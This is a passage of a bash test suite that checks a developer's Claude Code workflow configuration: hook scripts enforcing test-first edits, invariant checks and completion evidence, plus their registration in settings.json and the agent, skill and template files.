#!/usr/bin/env bash
set -euo pipefail

# Workflow Integrity Test Suite
# Validates the entire ~/.claude/ workflow system structure.
# Runs as the final step of /compound to ensure modifications don't break the system.
#
# Sections:
#  1. All hook scripts exist and are executable
#  2. check-test-exists.sh — TDD enforcement (behavioral)
#  3. check-invariants.sh — Invariant verification (behavioral)
#  4. verify-completion.sh — Anti-premature completion (behavioral)
#  5. post-edit-quality.sh — Auto-format Biome/ESLint (behavioral)
#  6. end-of-turn-typecheck.sh — TypeScript type checking (behavioral)
#  7. settings.json — Hook registration & env vars
#  8. settings.json — Cross-reference (every registered hook file exists)
#  9. CLAUDE.md — Key documentation present
# 10. Agent definitions — Exist with correct frontmatter
# 11. Skill definitions — All skills have SKILL.md
# 12. Plan skill — Build Candidate & INVARIANTS.md
# 13. PRD template — Structure
# 14. Sprint spec template — Structure
# 15. Evolution infrastructure — Files exist and JSON is valid
# 16. Compound skill — Self-test integration
# 17. check-docs-updated.sh — Docs gate on git push (behavioral)

HOOKS_DIR="$HOME/.claude/hooks"
SKILLS_DIR="$HOME/.claude/skills"
AGENTS_DIR="$HOME/.claude/agents"
EVOLUTION_DIR="$HOME/.claude/evolution"
FIXTURES_DIR="$(cd "$(dirname "$0")/testdata" && pwd)"
SETTINGS="$HOME/.claude/settings.json"
CLAUDE_MD="$HOME/.claude/CLAUDE.md"
PASS=0
FAIL=0
TOTAL=0

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m'

pass() {
  PASS=$((PASS + 1))
  TOTAL=$((TOTAL + 1))
  printf "${GREEN}  PASS${NC}: %s\n" "$1"
}

fail() {
  FAIL=$((FAIL + 1))
  TOTAL=$((TOTAL + 1))
  printf "${RED}  FAIL${NC}: %s\n" "$1"
  if [ -n "${2:-}" ]; then
    printf "        %s\n" "$2"
  fi
}

header() {
  printf "\n${YELLOW}=== %s ===${NC}\n" "$1"
}

# Helper: simulate hook JSON input for Write/Edit tools
make_write_input() {
  local file_path="$1"
  cat <<EOF
{"tool_name":"Write","tool_input":{"file_path":"$file_path","content":"test"}}
EOF
}

make_stop_input() {
  cat <<EOF
{"stop_hook_active":false}
EOF
}

make_stop_input_active() {
  cat <<EOF
{"stop_hook_active":true}
EOF
}

# Helper: simulate hook JSON input for Bash tool (PreToolUse)
make_bash_input() {
  local command="$1"
  cat <<EOF
{"tool_name":"Bash","tool_input":{"command":"$command"}}
EOF
}

# ============================================================
header "1. All Hook Scripts Exist and Are Executable"
# ============================================================

ALL_HOOKS=(
  block-dangerous.sh
  check-docs-updated.sh
  check-invariants.sh
  check-test-exists.sh
  compound-reminder.sh
  end-of-turn-typecheck.sh
  post-edit-quality.sh
  proot-preflight.sh
  validate-sprint-boundaries.sh
  verify-completion.sh
  worktree-preflight.sh
)

for hook in "${ALL_HOOKS[@]}"; do
  if [ -x "$HOOKS_DIR/$hook" ]; then
    pass "$hook exists and is executable"
  else
    fail "$hook missing or not executable"
  fi
done

# retry-with-backoff.sh is sourced, not executed directly — just check it exists
if [ -f "$HOOKS_DIR/retry-with-backoff.sh" ]; then
  pass "retry-with-backoff.sh exists (sourced utility)"
else
  fail "retry-with-backoff.sh missing"
fi

# ============================================================
header "2. check-test-exists.sh — TDD Enforcement"
# ============================================================

# Test 2.1: ALLOW edit when test file exists (auth.ts has __tests__/auth.test.ts)
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-tests/src/auth.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-tests" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  pass "Allows edit when test file exists (auth.ts -> __tests__/auth.test.ts)"
else
  fail "Blocked edit despite test file existing" "auth.ts has __tests__/auth.test.ts"
fi

# Test 2.2: BLOCK edit when NO test file exists (utils.ts has no test)
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-tests/src/utils.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-tests" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  fail "Allowed edit when no test file exists" "utils.ts should be blocked"
else
  EXIT_CODE=$?
  if [ "$EXIT_CODE" -eq 2 ]; then
    pass "Blocks edit when no test file exists (utils.ts, exit 2)"
  else
    fail "Wrong exit code for missing test" "Expected 2, got $EXIT_CODE"
  fi
fi

# Test 2.3: BLOCK edit in project-no-tests (handler.ts has no test)
INPUT=$(make_write_input "$FIXTURES_DIR/project-no-tests/src/handler.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-no-tests" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  fail "Allowed edit when no test file exists" "handler.ts should be blocked"
else
  EXIT_CODE=$?
  if [ "$EXIT_CODE" -eq 2 ]; then
    pass "Blocks edit in project with test infra but no test file (handler.ts)"
  else
    fail "Wrong exit code" "Expected 2, got $EXIT_CODE"
  fi
fi

# Test 2.4: ALLOW edit on test files themselves (should skip)
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-tests/src/__tests__/auth.test.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-tests" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  pass "Allows editing test files (auth.test.ts is skip-listed)"
else
  fail "Blocked editing a test file" "Test files should always be allowed"
fi

# Test 2.5: ALLOW edit on config files (should skip)
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-tests/vitest.config.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-tests" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  pass "Allows editing config files (vitest.config.ts is skip-listed)"
else
  fail "Blocked editing a config file" "Config files should be allowed"
fi

# Test 2.6: ALLOW edit on non-code files (markdown)
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-tests/README.md")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-tests" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  pass "Allows editing non-code files (README.md)"
else
  fail "Blocked editing a markdown file" "Non-code files should be allowed"
fi

# Test 2.7: ALLOW edit on index.ts (barrel exports are skip-listed)
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-tests/src/index.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-tests" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  pass "Allows editing index.ts (barrel export skip-listed)"
else
  fail "Blocked editing index.ts" "Barrel exports should be allowed"
fi

# Test 2.8: ALLOW when project has NO test infrastructure at all
INPUT=$(make_write_input "/tmp/no-test-infra/src/foo.ts")
mkdir -p /tmp/no-test-infra/src
echo "export const x = 1;" > /tmp/no-test-infra/src/foo.ts
if echo "$INPUT" | CLAUDE_PROJECT_DIR="/tmp/no-test-infra" "$HOOKS_DIR/check-test-exists.sh" >/dev/null 2>&1; then
  pass "Allows edit when project has no test infrastructure"
else
  fail "Blocked edit in project without test infrastructure" "Should gracefully skip"
fi
rm -rf /tmp/no-test-infra

# ============================================================
header "3. check-invariants.sh — Invariant Verification"
# ============================================================

# Test 3.1: ALLOW edit when all invariants pass
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-invariants/src/service.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-invariants" "$HOOKS_DIR/check-invariants.sh" >/dev/null 2>&1; then
  pass "Allows edit when all invariants pass"
else
  fail "Blocked edit despite all invariants passing"
fi

# Test 3.2: ALLOW edit when no INVARIANTS.md exists
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-tests/src/auth.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-tests" "$HOOKS_DIR/check-invariants.sh" >/dev/null 2>&1; then
  pass "Allows edit when no INVARIANTS.md exists (graceful skip)"
else
  fail "Blocked edit in project without INVARIANTS.md"
fi

# Test 3.3: BLOCK edit when invariant verify command fails
TEMP_PROJECT="/tmp/test-invariants-fail"
mkdir -p "$TEMP_PROJECT/src"
echo "export const x = 1;" > "$TEMP_PROJECT/src/module.ts"
echo "test('x', () => {});" > "$TEMP_PROJECT/src/module.test.ts"
cat > "$TEMP_PROJECT/INVARIANTS.md" << 'INVEOF'
## Must Have README
- **Owner:** docs
- **Verify:** `test -f README.md`
- **Fix:** Create README.md
INVEOF

INPUT=$(make_write_input "$TEMP_PROJECT/src/module.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-invariants.sh" >/dev/null 2>&1; then
  fail "Allowed edit when invariant verify command fails" "README.md doesn't exist"
else
  EXIT_CODE=$?
  if [ "$EXIT_CODE" -eq 2 ]; then
    pass "Blocks edit when invariant verify command fails (exit 2)"
  else
    fail "Wrong exit code for invariant violation" "Expected 2, got $EXIT_CODE"
  fi
fi
rm -rf "$TEMP_PROJECT"

# Test 3.4: ALLOW edit on non-code files (skip invariant check)
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-invariants/README.md")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-invariants" "$HOOKS_DIR/check-invariants.sh" >/dev/null 2>&1; then
  pass "Skips invariant check for non-code files"
else
  fail "Ran invariant check on non-code file"
fi

# Test 3.5: Cascading invariants — component-level INVARIANTS.md
TEMP_PROJECT="/tmp/test-invariants-cascade"
mkdir -p "$TEMP_PROJECT/src/api"
echo "export const x = 1;" > "$TEMP_PROJECT/src/api/handler.ts"
echo "test('x', () => {});" > "$TEMP_PROJECT/src/api/handler.test.ts"
# Project-level: always passes
cat > "$TEMP_PROJECT/INVARIANTS.md" << 'INVEOF'
## Project Level OK
- **Verify:** `true`
INVEOF
# Component-level: fails
cat > "$TEMP_PROJECT/src/api/INVARIANTS.md" << 'INVEOF'
## API Must Have OpenAPI Spec
- **Verify:** `test -f src/api/openapi.yaml`
- **Fix:** Generate openapi.yaml
INVEOF

INPUT=$(make_write_input "$TEMP_PROJECT/src/api/handler.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/check-invariants.sh" >/dev/null 2>&1; then
  fail "Missed component-level invariant violation" "openapi.yaml doesn't exist"
else
  EXIT_CODE=$?
  if [ "$EXIT_CODE" -eq 2 ]; then
    pass "Catches component-level cascading invariant violations"
  else
    fail "Wrong exit code for cascading invariant" "Expected 2, got $EXIT_CODE"
  fi
fi
rm -rf "$TEMP_PROJECT"

# ============================================================
header "4. verify-completion.sh — Anti-Premature Completion"
# ============================================================

# Test 4.1: ALLOW when no task directory exists
INPUT=$(make_stop_input)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="/tmp/empty-project" "$HOOKS_DIR/verify-completion.sh" >/dev/null 2>&1; then
  pass "Allows stop when no task directory exists"
else
  fail "Blocked stop in project without tasks"
fi

# Test 4.2: ALLOW when stop_hook_active is true (prevent infinite loop)
INPUT=$(make_stop_input_active)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" "$HOOKS_DIR/verify-completion.sh" >/dev/null 2>&1; then
  pass "Skips check when stop_hook_active (prevents infinite loop)"
else
  fail "Did not respect stop_hook_active flag"
fi

# Test 4.3: BLOCK when task is complete but no evidence marker
touch "$FIXTURES_DIR/project-completed/docs/tasks/test/feature/2026-03-16_1200-test/progress.json"
UNIQUE_SESSION="test-session-$$"
STATE_DIR="$HOME/.claude/state"
mkdir -p "$STATE_DIR"
rm -f "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION"

INPUT=$(make_stop_input)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$UNIQUE_SESSION" "$HOOKS_DIR/verify-completion.sh" >/dev/null 2>&1; then
  fail "Allowed completion without evidence marker" "Should block"
else
  EXIT_CODE=$?
  if [ "$EXIT_CODE" -eq 2 ]; then
    pass "Blocks completion when no evidence marker exists (exit 2)"
  else
    fail "Wrong exit code for missing evidence" "Expected 2, got $EXIT_CODE"
  fi
fi

# Test 4.4: ALLOW when evidence marker exists with required fields
cat > "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION" << 'EOF'
plan_reread: true
acceptance_criteria_cited: true
dev_server_verified: true
non_privileged_user_tested: true
timestamp: 2026-03-16T12:00:00
EOF

INPUT=$(make_stop_input)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$UNIQUE_SESSION" "$HOOKS_DIR/verify-completion.sh" >/dev/null 2>&1; then
  pass "Allows completion when evidence marker exists with all fields"
else
  fail "Blocked completion despite valid evidence marker"
fi
rm -f "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION"

# Test 4.5: BLOCK when evidence marker exists but missing required fields
cat > "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION" << 'EOF'
plan_reread: true
dev_server_verified: true
EOF

INPUT=$(make_stop_input)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-completed" CLAUDE_SESSION_ID="$UNIQUE_SESSION" "$HOOKS_DIR/verify-completion.sh" >/dev/null 2>&1; then
  fail "Allowed completion with incomplete evidence" "Missing non_privileged_user_tested"
else
  EXIT_CODE=$?
  if [ "$EXIT_CODE" -eq 2 ]; then
    pass "Blocks completion when evidence marker is incomplete (missing field)"
  else
    fail "Wrong exit code for incomplete evidence" "Expected 2, got $EXIT_CODE"
  fi
fi
rm -f "$STATE_DIR/.claude-completion-evidence-$UNIQUE_SESSION"

# ============================================================
header "5. post-edit-quality.sh — Auto-Format (Biome/ESLint)"
# ============================================================

# Test 5.1: SKIP non-TS/JS files (markdown)
INPUT=$(make_write_input "$FIXTURES_DIR/project-with-tests/README.md")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$FIXTURES_DIR/project-with-tests" "$HOOKS_DIR/post-edit-quality.sh" >/dev/null 2>&1; then
  pass "Skips non-TS/JS files (README.md)"
else
  fail "Ran formatter on non-TS/JS file"
fi

# Test 5.2: SKIP excluded directories (node_modules)
TEMP_PROJECT="/tmp/test-post-edit-quality"
mkdir -p "$TEMP_PROJECT/node_modules/pkg"
echo "export const x = 1;" > "$TEMP_PROJECT/node_modules/pkg/index.ts"
INPUT=$(make_write_input "$TEMP_PROJECT/node_modules/pkg/index.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/post-edit-quality.sh" >/dev/null 2>&1; then
  pass "Skips files in node_modules/"
else
  fail "Ran formatter on file in node_modules/"
fi

# Test 5.3: SKIP excluded directories (dist)
mkdir -p "$TEMP_PROJECT/dist"
echo "export const x = 1;" > "$TEMP_PROJECT/dist/bundle.js"
INPUT=$(make_write_input "$TEMP_PROJECT/dist/bundle.js")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/post-edit-quality.sh" >/dev/null 2>&1; then
  pass "Skips files in dist/"
else
  fail "Ran formatter on file in dist/"
fi

# Test 5.4: SKIP excluded directories (.next)
mkdir -p "$TEMP_PROJECT/.next/static"
echo "export const x = 1;" > "$TEMP_PROJECT/.next/static/chunk.js"
INPUT=$(make_write_input "$TEMP_PROJECT/.next/static/chunk.js")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/post-edit-quality.sh" >/dev/null 2>&1; then
  pass "Skips files in .next/"
else
  fail "Ran formatter on file in .next/"
fi

# Test 5.5: SKIP when no linter config found (no biome.json, no eslint config)
mkdir -p "$TEMP_PROJECT/src"
echo "export const x = 1;" > "$TEMP_PROJECT/src/app.ts"
INPUT=$(make_write_input "$TEMP_PROJECT/src/app.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/post-edit-quality.sh" >/dev/null 2>&1; then
  pass "Skips silently when no linter config found"
else
  fail "Failed when no linter config found (should skip)"
fi

# Test 5.6: DETECT biome.json config (won't run biome since not installed, but should attempt)
echo '{}' > "$TEMP_PROJECT/biome.json"
INPUT=$(make_write_input "$TEMP_PROJECT/src/app.ts")
# This will fail because biome is not installed, but the important thing is it TRIES
# (exits non-zero because the biome command fails, not because the hook logic is wrong)
OUTPUT=$(echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/post-edit-quality.sh" 2>&1) || true
EXIT_CODE=$?
if [ "$EXIT_CODE" -eq 2 ] || [ "$EXIT_CODE" -eq 0 ]; then
  pass "Detects biome.json and attempts biome check (exit $EXIT_CODE)"
else
  fail "Unexpected exit code with biome.json present" "Expected 0 or 2, got $EXIT_CODE"
fi
rm -f "$TEMP_PROJECT/biome.json"

# Test 5.7: DETECT eslint config (won't run eslint since not installed, but should attempt)
echo '{}' > "$TEMP_PROJECT/.eslintrc.json"
INPUT=$(make_write_input "$TEMP_PROJECT/src/app.ts")
OUTPUT=$(echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/post-edit-quality.sh" 2>&1) || true
EXIT_CODE=$?
if [ "$EXIT_CODE" -eq 2 ] || [ "$EXIT_CODE" -eq 0 ]; then
  pass "Detects .eslintrc.json and attempts eslint --fix (exit $EXIT_CODE)"
else
  fail "Unexpected exit code with .eslintrc.json present" "Expected 0 or 2, got $EXIT_CODE"
fi
rm -f "$TEMP_PROJECT/.eslintrc.json"

# Test 5.8: SKIP when file doesn't exist
INPUT=$(make_write_input "$TEMP_PROJECT/src/nonexistent.ts")
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/post-edit-quality.sh" >/dev/null 2>&1; then
  pass "Skips when file doesn't exist"
else
  fail "Failed on nonexistent file (should skip)"
fi

rm -rf "$TEMP_PROJECT"

# ============================================================
header "6. end-of-turn-typecheck.sh — TypeScript Type Checking"
# ============================================================

# Test 6.1: SKIP when stop_hook_active is true (prevent infinite loop)
INPUT=$(make_stop_input_active)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="/tmp/empty" "$HOOKS_DIR/end-of-turn-typecheck.sh" >/dev/null 2>&1; then
  pass "Skips when stop_hook_active (prevents infinite loop)"
else
  fail "Did not respect stop_hook_active flag"
fi

# Test 6.2: SKIP when no tsconfig.json exists
TEMP_PROJECT="/tmp/test-typecheck"
mkdir -p "$TEMP_PROJECT/src"
echo "export const x: number = 1;" > "$TEMP_PROJECT/src/app.ts"
INPUT=$(make_stop_input)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/end-of-turn-typecheck.sh" >/dev/null 2>&1; then
  pass "Skips when no tsconfig.json exists"
else
  fail "Ran type check without tsconfig.json"
fi

# Test 6.3: SKIP when no code was written this turn (no recent file changes)
# Create a tsconfig but no recent changes
echo '{"compilerOptions":{"strict":true}}' > "$TEMP_PROJECT/tsconfig.json"
# Touch the typecheck log to be newer than any files
LOG_DIR="$HOME/.claude/hooks/logs"
mkdir -p "$LOG_DIR"
sleep 1
touch "$LOG_DIR/typecheck.log"
INPUT=$(make_stop_input)
if echo "$INPUT" | CLAUDE_PROJECT_DIR="$TEMP_PROJECT" "$HOOKS_DIR/end-of-turn-typecheck.sh" >/dev/null 2>&1; then
  pass "Skips when no code was written this turn (no recent changes)"
else
  fail "Ran type check despite no recent code changes"
fi

rm -rf "$TEMP_PROJECT"

# ============================================================
header "7. settings.json — Hook Registration & Env Vars"
# ============================================================

# 5.1-5.3: Key hooks registered to correct lifecycle events
if jq -e '.hooks.PreToolUse[] | select(.matcher == "Write|Edit|MultiEdit") | .hooks[] | select(.command | contains("check-test-exists"))' "$SETTINGS" >/dev/null 2>&1; then
  pass "check-test-exists.sh registered as PreToolUse(Write|Edit|MultiEdit)"
else
  fail "check-test-exists.sh not found in PreToolUse hooks"
fi

if jq -e '.hooks.PostToolUse[] | select(.matcher == "Write|Edit|MultiEdit") | .hooks[] | select(.command | contains("check-invariants"))' "$SETTINGS" >/dev/null 2>&1; then
  pass "check-invariants.sh registered as PostToolUse(Write|Edit|MultiEdit)"
else
  fail "check-invariants.sh not found in PostToolUse hooks"
fi

if jq -e '.hooks.Stop[].hooks[] | select(.command | contains("verify-completion"))' "$SETTINGS" >/dev/null 2>&1; then
  pass "verify-completion.sh registered as Stop hook"
else
  fail "verify-completion.sh not found in Stop hooks"
fi

# 5.4: PreToolUse(Bash) hooks registered
if jq -e '.hooks.PreToolUse[] | select(.matcher == "Bash") | .hooks[] | select(.command | contains("block-dangerous"))' "$SETTINGS" >/dev/null 2>&1; then
  pass "block-dangerous.sh registered as PreToolUse(Bash)"
else
  fail "block-dangerous.sh not found in PreToolUse(Bash) hooks"
fi

if jq -e '.hooks.PreToolUse[] | select(.matcher == "Bash") | .hooks[] | select(.command | contains("proot-preflight"))' "$SETTINGS" >/dev/null 2>&1; then
  pass "proot-preflight.sh registered as PreToolUse(Bash)"
else
  fail "proot-preflight.sh not found in PreToolUse(Bash) hooks"
fi

# 5.5: PostToolUse hooks
if jq -e '.hooks.PostToolUse[] | select(.matcher == "Write|Edit|MultiEdit") | .hooks[] | select(.command | contains("post-edit-quality"))' "$SETTINGS" >/dev/null 2>&1; then
  pass "post-edit-quality.sh registered as PostToolUse(Write|Edit|MultiEdit)"
else
  fail "post-edit-quality.sh not found in PostToolUse hooks"
fi

# 5.6: Stop hooks — all three present
for stop_hook in "end-of-turn-typecheck" "compound-reminder" "verify-completion"; do
  if jq -e ".hooks.Stop[].hooks[] | select(.command | contains(\"$stop_hook\"))" "$SETTINGS" >/dev/null 2>&1; then
    pass "$stop_hook registered as Stop hook"
  else
    fail "$stop_hook not found in Stop hooks"
  fi
done

# 5.7: Notification hook exists
if jq -e '.hooks.Notification | length > 0' "$SETTINGS" >/dev/null 2>&1; then
  pass "Notification hook section exists"
else
  fail "Notification hook section missing"
fi

# 5.8: Environment variables
for env_var in "NODE_OPTIONS" "CHOKIDAR_USEPOLLING" "WATCHPACK_POLLING"; do
  if jq -e ".env.\"$env_var\"" "$SETTINGS" >/dev/null 2>&1; then
    pass "env.$env_var is set in settings.json"
  else
    fail "env.$env_var missing from settings.json"
  fi
done

# ============================================================
header "8. settings.json — Cross-Reference (hook files exist)"
# ============================================================

# Extract every hook command that references ~/.claude/hooks/ and verify the file exists
HOOK_COMMANDS=$(jq -r '.. | .command? // empty' "$SETTINGS" | grep '\.claude/hooks/' || true)
if [ -z "$HOOK_COMMANDS" ]; then
  fail "No hook commands found referencing ~/.claude/hooks/"
else
  while IFS= read -r cmd; do
    # Expand ~ to $HOME and extract the script path
    SCRIPT_PATH=$(echo "$cmd" | sed "s|~|$HOME|g" | grep -oP '\S*\.claude/hooks/\S+\.sh' || true)
    if [ -n "$SCRIPT_PATH" ] && [ -f "$SCRIPT_PATH" ]; then
      pass "Hook file exists: $(basename "$SCRIPT_PATH")"
    elif [ -n "$SCRIPT_PATH" ]; then
      fail "Hook registered but file missing: $SCRIPT_PATH"
    fi
  done <<< "$HOOK_COMMANDS"
fi

# ============================================================
header "9. CLAUDE.md — Key Documentation"
# ============================================================

# Core workflow concepts documented
declare -A CLAUDE_MD_CHECKS=(
  ["check-test-exists.sh"]="TDD enforcement hook"
  ["check-invariants.sh"]="Invariant verification hook"
  ["verify-completion.sh"]="Anti-premature completion hook"
  ["Architecture Invariant Registry"]="Invariant Registry section"
  ["Build Candidate"]="Build Candidate concept"
  ["Test as the user, not the builder"]="Non-privileged user testing"
  ["Anti-Premature Completion"]="Anti-Premature Completion Protocol"
  ["Preconditions"]="INVARIANTS.md format (Preconditions)"
  ["Postconditions"]="INVARIANTS.md format (Postconditions)"
  ["Contract-First"]="Contract-First Pattern"
  ["Correctness Discovery"]="Correctness Discovery process"
  ["Verification Integrity"]="Verification Integrity rules"
  ["Context Rot"]="Context Rot Protocol"
  ["Block destructive commands"]="PreToolUse(Bash) block-dangerous behavior"
  ["compound reminder"]="Stop hook compound-reminder behavior"
  ["end-of-turn-typecheck"]="end-of-turn-typecheck hook"
  ["Auto-format"]="PostToolUse auto-format behavior"
  ["proot-preflight"]="proot-preflight hook"
)

for pattern in "${!CLAUDE_MD_CHECKS[@]}"; do
  label="${CLAUDE_MD_CHECKS[$pattern]}"
  if grep -q "$pattern" "$CLAUDE_MD"; then
    pass "CLAUDE.md documents: $label"
  else
    fail "CLAUDE.md missing: $label"
  fi
done

# ============================================================
header "10. Agent Definitions"
# ============================================================

EXPECTED_AGENTS=(orchestrator sprint-executor code-reviewer)

for agent in "${EXPECTED_AGENTS[@]}"; do
  AGENT_FILE="$AGENTS_DIR/$agent.md"
  if [ -f "$AGENT_FILE" ]; then
    pass "Agent file exists: $agent.md"
  else
    fail "Agent file missing: $agent.md"
    continue
  fi

  # Check frontmatter has name field matching filename
  if grep -q "^name: $agent" "$AGENT_FILE"; then
    pass "Agent $agent has correct name in frontmatter"
  else
    fail "Agent $agent frontmatter name mismatch"
  fi

  # Check model assignment
  if grep -q "^model:" "$AGENT_FILE"; then
    pass "Agent $agent has model assignment"
  else
    fail "Agent $agent missing model assignment"
  fi
done

# Orchestrator-specific checks
if grep -q "completion-evidence" "$AGENTS_DIR/orchestrator.md"; then
  pass "Orchestrator writes completion evidence marker"
else
  fail "Orchestrator missing completion evidence marker"
fi

if grep -q "non-privileged" "$AGENTS_DIR/orchestrator.md" || grep -q "not admin" "$AGENTS_DIR/orchestrator.md"; then
  pass "Orchestrator includes non-privileged user testing"
else
  fail "Orchestrator missing non-privileged user testing"
fi

if grep -q "INVARIANTS.md" "$AGENTS_DIR/orchestrator.md"; then
  pass "Orchestrator references INVARIANTS.md verification"
else
  fail "Orchestrator missing INVARIANTS.md verification"
fi

# Sprint-executor-specific checks
if grep -q "isolation: worktree" "$AGENTS_DIR/sprint-executor.md"; then
  pass "Sprint-executor uses worktree isolation"
else
  fail "Sprint-executor missing worktree isolation"
fi

# Code-reviewer-specific checks
if grep -q "Read" "$AGENTS_DIR/code-reviewer.md" && ! grep -q "Write" "$AGENTS_DIR/code-reviewer.md"; then
  pass "Code-reviewer is read-only (has Read, no Write)"
else
  # Check more carefully — Write might appear in description text, not in tools
  if grep -q "^tools:.*Write" "$AGENTS_DIR/code-reviewer.md"; then
    fail "Code-reviewer has Write in tools (should be read-only)"
  else
    pass "Code-reviewer is read-only (Write only in description, not tools)"
  fi
fi

# ============================================================
header "11. Skill Definitions"
# ============================================================

EXPECTED_SKILLS=(compound plan plan-build-test ship-test-ensure workflow-audit)

for skill in "${EXPECTED_SKILLS[@]}"; do
  SKILL_FILE="$SKILLS_DIR/$skill/SKILL.md"
  if [ -f "$SKILL_FILE" ]; then
    pass "Skill SKILL.md exists: $skill"
  else
    fail "Skill SKILL.md missing: $skill"
    continue
  fi

  # Check frontmatter exists
  if head -1 "$SKILL_FILE" | grep -q "^---"; then
    pass "Skill $skill has frontmatter"
  else
    fail "Skill $skill missing frontmatter"
  fi
done

# ============================================================
header "12. Plan Skill — Build Candidate & INVARIANTS.md"
# ============================================================

PLAN_SKILL="$SKILLS_DIR/plan/SKILL.md"

if grep -q "Build Candidate" "$PLAN_SKILL"; then
  pass "Plan skill includes Build Candidate tagging step"
else
  fail "Plan skill missing Build Candidate step"
fi

if grep -q "INVARIANTS.md" "$PLAN_SKILL"; then
  pass "Plan skill includes INVARIANTS.md creation step"
else
  fail "Plan skill missing INVARIANTS.md creation"
fi

if grep -q "build-candidate/" "$PLAN_SKILL"; then
  pass "Plan skill includes build-candidate/ git tag"
else
  fail "Plan skill missing git tag command for Build Candidate"
fi

# Plan support files exist
for plan_file in correctness-discovery.md prd-template-full.md prd-template-minimal.md sprint-spec-template.md; do
  if [ -f "$SKILLS_DIR/plan/$plan_file" ]; then
    pass "Plan support file exists: $plan_file"
  else
    fail "Plan support file missing: $plan_file"
  fi
done

# ============================================================
header "13. PRD Template — Structure"
# ============================================================

PRD_TEMPLATE="$SKILLS_DIR/plan/prd-template-full.md"

if grep -q "Architecture Invariant Registry" "$PRD_TEMPLATE"; then
  pass "PRD template includes Architecture Invariant Registry section"
else
  fail "PRD template missing Architecture Invariant Registry section"
fi

# Section numbering has no duplicates
SECTION_NUMS=$(grep -oP '^## \K\d+' "$PRD_TEMPLATE" | sort -n)
EXPECTED_NUMS=$(grep -oP '^## \K\d+' "$PRD_TEMPLATE" | sort -n -u)
if [ "$SECTION_NUMS" = "$EXPECTED_NUMS" ]; then
  pass "PRD template section numbering has no duplicates"
else
  fail "PRD template has duplicate section numbers" "$SECTION_NUMS"
fi

# ============================================================
header "14. Sprint Spec Template — Structure"
# ============================================================

SPRINT_TEMPLATE="$SKILLS_DIR/plan/sprint-spec-template.md"

if grep -q "Consumed Invariants" "$SPRINT_TEMPLATE"; then
  pass "Sprint spec template includes Consumed Invariants section"
else
  fail "Sprint spec template missing Consumed Invariants section"
fi

# ============================================================
header "15. Evolution Infrastructure"
# ============================================================

# Directory exists
if [ -d "$EVOLUTION_DIR" ]; then
  pass "Evolution directory exists"
else
  fail "Evolution directory missing: $EVOLUTION_DIR"
fi

# Evolution files are gitignored (runtime data) — create if missing, then validate.
# These are created by /compound at runtime. On a fresh clone they won't exist.
for json_file in error-registry.json model-performance.json; do
  if [ ! -f "$EVOLUTION_DIR/$json_file" ]; then
    echo '[]' > "$EVOLUTION_DIR/$json_file"
  fi
  if [ -f "$EVOLUTION_DIR/$json_file" ]; then
    pass "$json_file exists"
    if jq empty "$EVOLUTION_DIR/$json_file" 2>/dev/null; then
      pass "$json_file is valid JSON"
    else
